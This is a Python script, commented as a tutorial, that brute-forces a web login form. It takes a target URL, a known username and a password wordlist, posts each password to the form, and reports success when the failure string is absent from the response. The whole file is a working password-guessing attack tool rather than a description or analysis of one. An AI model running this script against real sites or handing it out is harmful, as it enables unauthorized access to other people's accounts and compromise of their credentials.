# Import the requests library to enable web requests to be processed.
import requests
from termcolor import colored

# Define the URL to target, along with the username (we are assuming the username is known), and the password list file.
url = input('[+] Enter the target URL: ')
username = input('[+] Enter the target username: ')
password_file = input('[+] Enter the password file: ')
# Define the name of the username and password fields on the target page, along with the type and name of the submit button.
userfield = input('[+] What is the name of the username field?: ')
passfield = input('[+] What is the name of the password field?: ')
loginbutton = input('[+] What is the name of the login button?: ')
buttontype = input('[+] What is the type of login button?: ')
login_failed_string = input('[+] Enter failed login string from target: ')

# Create a new function ('cracking'), which will processe authentication requests and parsing either 'success' or 'fail' responses.
def cracking(username,url,login_failed_string):
    # Create a loop to cycle through the passwords in the file.
    for password in passwords:
        # Strip the password string to remove any spaces.
        password = password.strip()
        # Verbosity - print each password being tried, as it's being tried.
        print(colored('[+] Trying password: ', 'cyan') + password)
        # Define a variable storing the username, password and login button information from our variables.
        data = {userfield:username,passfield:password,loginbutton:buttontype}
        # Store the response from the request in a variable for printing.
        response = requests.post(url, data=data)
        # If the failed login response is found in the response page content, then pass and continue trying.
        if login_failed_string in response.content.decode():
            pass
        else:
            # Otherwise, assume the login was a success and print the successful username and password, then exit the loop.
            print(colored('[+++] SUCCESS: Username: ', 'green', attrs=['blink']) + username)
            print(colored('[+++] SUCCESS: Password: ', 'green', attrs=['blink']) + password)
            # Exit the program completely at this stage.
            exit()

# Once the program has been run, open the password file using 'r' (read), and call the 'cracking' function defined above.
with open(password_file, 'r') as passwords:
        cracking(username,url,login_failed_string)

# If the loop completes with no successful password found, then print as such and end the program.
print(colored('[-] No passwords succeeded.', 'red', attrs=['blink']))